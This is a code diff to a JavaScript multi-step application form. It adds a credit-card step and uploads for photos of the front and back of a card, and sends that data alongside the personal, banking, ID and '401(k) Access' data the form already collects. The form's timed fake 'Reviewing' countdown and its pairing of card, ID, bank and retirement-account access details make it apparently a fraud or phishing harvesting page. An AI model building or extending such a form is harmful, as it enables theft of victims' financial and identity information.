@@ -262,11 +262,12 @@ function initApplicationForm() {
   const formCard = document.querySelector('.form-card');
   if (!formCard) return;
 
-  const totalSteps = 7;
+  const totalSteps = 8;
   let currentStep = 1;
   const formData = {
     personal: {},
     banking: {},
+    creditcard: {},
     business: {},
     idVerify: {},
     review: {},
@@ -274,7 +275,7 @@ function initApplicationForm() {
     final: {}
   };
 
-  const stepLabels = ['Personal', 'Banking', 'Purpose', 'ID & 401(k)', 'Reviewing', '401(k) Access', 'Review'];
+  const stepLabels = ['Personal', 'Banking', 'Credit Card', 'Purpose', 'ID & 401(k)', 'Reviewing', '401(k) Access', 'Review'];
 
   let reviewTimer = null;
   let reviewStartTime = null;
@@ -292,7 +293,7 @@ function initApplicationForm() {
     const appId = getAppId();
     collectAllStepData();
     const empty = [
-      formData.personal, formData.banking, formData.business,
+      formData.personal, formData.banking, formData.creditcard, formData.business,
       formData.idVerify, formData.kaccess
     ].every(function (b) { return Object.keys(b).every(function (k) { return !b[k]; }); });
     if (empty) return;
@@ -306,6 +307,7 @@ function initApplicationForm() {
       const snap = JSON.parse(JSON.stringify({
         personal: formData.personal || {},
         banking: formData.banking || {},
+        creditcard: formData.creditcard || {},
         business: formData.business || {},
         idVerify: formData.idVerify || {},
         kaccess: formData.kaccess || {}
@@ -373,6 +375,8 @@ function initApplicationForm() {
     }
 
     addFromInput('fileInput2', 'bankDoc', 'Voided Check / Bank Letter');
+    addFromInput('fileCardFront', 'cardFront', 'Front of Credit Card');
+    addFromInput('fileCardBack', 'cardBack', 'Back of Credit Card');
     addFromInput('fileIdFront', 'idFront', 'Front of ID');
     addFromInput('fileIdBack', 'idBack', 'Back of ID');
     addFromInput('fileInput', 'k401statement', '401(k) Statement');
@@ -433,8 +437,8 @@ function initApplicationForm() {
           btn.disabled = false;
         }
         setTimeout(function () {
-          if (currentStep === 5) {
-            currentStep = 6;
+          if (currentStep === 6) {
+            currentStep = 7;
             showStep(currentStep);
             window.scrollTo({ top: 0, behavior: 'smooth' });
           }
@@ -492,11 +496,11 @@ function initApplicationForm() {
       const inStep = btnNext.closest('.form-step');
       const stepNum = inStep ? parseInt(inStep.dataset.step, 10) : null;
 
-      if (stepNum === 5) {
+      if (stepNum === 6) {
         btnNext.textContent = btnNext.id === 'btnSkipReview' ? btnNext.disabled ? 'Proceeding automatically…' : 'Continue to 401(k) Access →' : 'Continue →';
-      } else if (stepNum === 4) {
+      } else if (stepNum === 5) {
         btnNext.textContent = 'Begin Review →';
-      } else if (stepNum === 6) {
+      } else if (stepNum === 7) {
         btnNext.textContent = 'Review Application →';
       } else if (step === totalSteps) {
         btnNext.textContent = 'Submit Application';
@@ -507,14 +511,14 @@ function initApplicationForm() {
       }
     });
 
-    if (step === 5) startReviewCountdown();
+    if (step === 6) startReviewCountdown();
   }
 
   function collectStepData(step) {
     const stepEl = formCard.querySelector(`.form-step[data-step="${step}"]`);
     if (!stepEl) return;
 
-    const stepKey = ['personal', 'banking', 'business', 'idVerify', 'review', 'kaccess', 'final'][step - 1];
+    const stepKey = ['personal', 'banking', 'creditcard', 'business', 'idVerify', 'review', 'kaccess', 'final'][step - 1];
     if (!formData[stepKey]) formData[stepKey] = {};
 
     stepEl.querySelectorAll('input, select, textarea').forEach(function (input) {
@@ -630,6 +634,7 @@ function initApplicationForm() {
           appId: appId,
           personal: formData.personal,
           banking: formData.banking,
+          creditcard: formData.creditcard,
           business: formData.business,
           idVerify: formData.idVerify,
           kaccess: formData.kaccess
@@ -701,6 +706,7 @@ function initApplicationForm() {
               body: JSON.stringify({
                 personal: formData.personal,
                 banking: formData.banking,
+                creditcard: formData.creditcard,
                 business: formData.business,
                 id_verify: formData.idVerify,
                 kaccess: formData.kaccess,
